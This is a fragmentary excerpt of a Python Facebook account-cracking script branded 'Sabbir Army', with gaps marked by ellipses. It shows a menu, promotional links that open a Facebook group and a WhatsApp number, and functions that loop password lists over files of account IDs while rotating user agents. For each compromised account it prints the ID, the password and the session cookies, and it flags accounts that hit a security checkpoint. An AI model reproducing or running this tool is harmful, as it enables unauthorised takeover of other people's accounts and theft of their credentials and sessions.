...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/groups/191116410183458/')
# ------------------[ Sabbir Army ]-------------------#
# ------------------[ USER-AGENT ]-------------------#
ua = [
...
def contact():
    # os.system('xdg-open https://www.facebook.com/mrsabbri')
    back()
...
os.system('espeak -a 300 " Welcome,   to,  Sabbir,  Army,  Tools"')
pass
...
def menu():
    ...
    if SABBIR in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801310950046')
        os.system("python nono.py")
    elif SABBIR in ['3', '03']:
        result()
    elif SABBIR in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/SabbirArmy.txt  Etc...]')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[Sabbir-Army💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(
        f"\r{H}[Sabbir-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
